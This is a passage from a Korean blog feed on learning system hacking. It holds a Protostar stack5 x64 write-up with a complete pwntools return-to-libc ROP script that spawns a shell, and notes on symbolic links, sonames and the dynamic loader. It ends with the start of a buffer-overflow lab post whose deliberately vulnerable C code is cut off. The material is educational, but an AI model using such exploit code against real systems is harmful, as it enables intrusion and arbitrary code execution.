&lt;p&gt;말이 거창했는데, 해결법은 간단하다. 내가 rsp 주소를 마음대로 바꾸다가 rsp 주소가 16의 배수가 아닌 8의 배수가 되도록 만들어 놨으니, rsp가 한 칸(8 bytes)을 더 내려가든 올라가든 하도록 하면 된다. 이 때 딱히 페이로드 구조를 크게 바꾸지 않고 rsp가 한 칸(8 bytes) 더 이동하도록 하는 제일 쉬운 방법은 ret를 처음에 하나 끼워넣는 것이다.&lt;/p&gt;

&lt;p&gt;즉 페이로드는 아래와 같은 형태가 된다.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget1 address(ret;) + Gadget2 address(pop rdi;ret;) + parameter address + Library function address
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ret add에 있는 인스트럭션의 주소로 rip를 옮겨놓으니 또 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;을 하래서 rsp가 가리키는 주소에 있는 주소값을 rip에 넣어주니 이번엔 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt;가 기다리고 있는 형식이다.&lt;/p&gt;

&lt;p&gt;위와 같은 페이로드를 보내기 위해 스크립트를 아래와 같이 변형했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;스크립트 실행 결과 아래와 같이 쉘을 딸 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-삽질이-남긴-지식&quot;&gt;3. 삽질이 남긴 지식&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-리눅스에서-프로그램-컴파일-시-refer되는-공유-라이브러리와-그-호출-과정&quot;&gt;3.1. 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정&lt;/h2&gt;

&lt;p&gt;먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 파일과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 이랑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 썼다며? 그런데 왜 정작 사용된 건 다른 거야??&lt;/p&gt;

&lt;h3 id=&quot;311-file-link&quot;&gt;3.1.1. File Link&lt;/h3&gt;

&lt;p&gt;이에 관해서는 리눅스의 soft link와 linker의 동적 라이브러리 호출에 대해 안다면 답을 알 수 있다.&lt;/p&gt;

&lt;p&gt;먼저 리눅스에는 파일 링크라는 시스템이 있는데, 이는 윈도우의 바로가기와 상당히 비슷하다. 이 파일 링크는 첫째, 하드 링크(Hard Link)와 둘째, 소프트 링크(Soft Link or Symbolic Link) 두 개 종류로 나뉘는데, 둘의 차이점은 원본 파일과 동일한 inode를 가지느냐, 다른 inode를 가지느냐이다. inode에 관해서는 os를 공부했다면 알 수 있는지라 자세히 설명하진 않겠지만 파일 시스템 상에서 파일을 호출할 때 참고하는 inode table상의 index 번호 정도로 설명을 퉁치고 넘어가려 한다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;하드 링크는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln {original file} {linked file}&lt;/code&gt; 명령어로 생성한다. 이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; 명령어로 inode를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 동일함을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌더라도 링크된 파일을 실행하면 원본 파일이 실행된다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;소프트 링크는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln -s {original file} {linked file}&lt;/code&gt; 명령어로 생성한다. 이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; 명령어로 inode와 파일 정보를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 다르며, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&amp;gt;&lt;/code&gt; 기호로 링크가 표시되어 있음을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌면 링크된 파일을 실행했을 때 링크가 원본 파일을 찾지 못한다. 아래 사진은 소프트 링크를 확인했을 때의 사진이다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2017.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;가장 첫 번째에 보이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816882&lt;/code&gt; 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816904&lt;/code&gt; 로 서로 다르다는 것을 확인할 수 있다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;좋아, 그렇다면 파일 실행 시 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 썼기 때문에 소프트 링크의 오리지널 파일인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 가 사용됐고 &lt;strong&gt;Dynamic Loader&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 를 썼기 때문에 링크가 걸린 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 가 사용됐다고 치자. (아래 사진 참고)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2018.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그런데 또 궁금한 게 생긴다. so 파일이 뭔지는 알겠는데… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.2&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.6&lt;/code&gt;은 대체 무슨 뜻이야?&lt;/p&gt;

&lt;h3 id=&quot;312-gcc를-이용한-c-언어-컴파일-시-파일-실행-시의-행위&quot;&gt;3.1.2. GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위&lt;/h3&gt;

&lt;p&gt;결론적으로 말하자면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so&lt;/code&gt; 파일은 해당 라이브러리의 대표 호칭 격인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;이고,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.2&lt;/code&gt; 등 뒤에 숫자가 붙은 파일은 해당 라이브러리의 하위 격인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;라이브러리에는 정적 라이브러리(&lt;em&gt;.a)와 동적(공유) 라이브러리(&lt;/em&gt;.so) 두 종류가 존재한다는 건 아마 이 블로그쯤 온 사람들이라면 알음알음 알 것이므로 생략한다. 윈도우에서는 동적 라이브러리로 *.dll 파일을 쓴다는 건… 쓰고 싶으니까 쓸거다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;컴파일 시의 행위:
    &lt;ul&gt;
      &lt;li&gt;프로그램 컴파일 시 트리거된 링커는 컴파일러와 프로그램을 참고해 필요한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;을 가진 라이브러리를 찾아내고, 해당 라이브러리의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt;을 읽어온다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;파일 실행 시의 행위:
    &lt;ul&gt;
      &lt;li&gt;이후 컴파일된 프로그램을 실행할 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 실행되고 이것이 Dynamic Link 된 공유 라이브러리를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 이용해 각종 변수로부터 위치를 찾아낸 다음 메모리에 띄워 준다. 그렇다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 RTL 기법의 주범이었던 것이다…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 인데, 심볼릭 링크 정책으로 인해 실제로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다.&lt;/p&gt;

&lt;p&gt;여기에서 soname을 가진 라이브러리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt;이기 때문에 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 으로 뜨지 않는다.&lt;/p&gt;

&lt;p&gt;마지막 의문이 하나 생긴다. 왜 굳이? 왜 굳이 이렇게 심볼릭 링크를 써서 돌아 돌아 가는 것일까? 그 이유는 라이브러리 연결의 호환성을 좋게 하기 위해서이다. 통상적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{library_name.so.1.5}-&amp;gt;{library_name.so}&lt;/code&gt; 의 구도로 링크가 걸리는데, 이는 개발 환경에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.1.5&lt;/code&gt; 버전의 라이브러리뿐 아니라 다른 버전의 라이브러리도 존재할 수 있기 때문에 어떤 버전(어떤 soname)을 사용하든 안정적으로 필요한 Linker name을 가진 라이브러리와 연결해주기 위해서 생겨난 방식이다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-참고문헌&quot;&gt;4. 참고문헌&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;x64dbg 디버거를 활용한 리버싱과 시스템 해킹의 원리(김민수 저, 210p RTL)&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 13 Nov 2022 05:31:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/system_hacking/protostar-stack5-x86-x64/</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/system_hacking/protostar-stack5-x86-x64/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5-3</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-5-3-bof-return-address-overwrite&quot; id=&quot;markdown-toc-stage-5-3-bof-return-address-overwrite&quot;&gt;STAGE 5-3: BOF-Return Address Overwrite&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#먼저-풀어보기&quot; id=&quot;markdown-toc-먼저-풀어보기&quot;&gt;먼저 풀어보기:&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-예제-코드-취약점-분석하기&quot; id=&quot;markdown-toc-1-예제-코드-취약점-분석하기&quot;&gt;1. 예제 코드 취약점 분석하기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-페이로드-구상하기&quot; id=&quot;markdown-toc-2-페이로드-구상하기&quot;&gt;2. 페이로드 구상하기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-익스플로잇-코드-작성하기&quot; id=&quot;markdown-toc-3-익스플로잇-코드-작성하기&quot;&gt;3. 익스플로잇 코드 작성하기&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#코스-내용-학습&quot; id=&quot;markdown-toc-코스-내용-학습&quot;&gt;코스 내용 학습:&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-취약점-분석&quot; id=&quot;markdown-toc-1-취약점-분석&quot;&gt;1. 취약점 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-취약점-트리거&quot; id=&quot;markdown-toc-2-취약점-트리거&quot;&gt;2. 취약점 트리거&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-익스플로잇&quot; id=&quot;markdown-toc-3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#취약점-패치&quot; id=&quot;markdown-toc-취약점-패치&quot;&gt;취약점 패치&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-5-3-bof-return-address-overwrite&quot;&gt;STAGE 5-3: BOF-Return Address Overwrite&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Stack Buffer Overflow로 인해 가능한 Return Address 조작 공격을 실습&lt;/li&gt;
  &lt;li&gt;해당 취약점이 존재하는 예제 프로그램 공격 및 셸 획득이 목표&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;먼저-풀어보기&quot;&gt;먼저 풀어보기:&lt;/h1&gt;

&lt;h2 id=&quot;1-예제-코드-취약점-분석하기&quot;&gt;1. 예제 코드 취약점 분석하기&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	
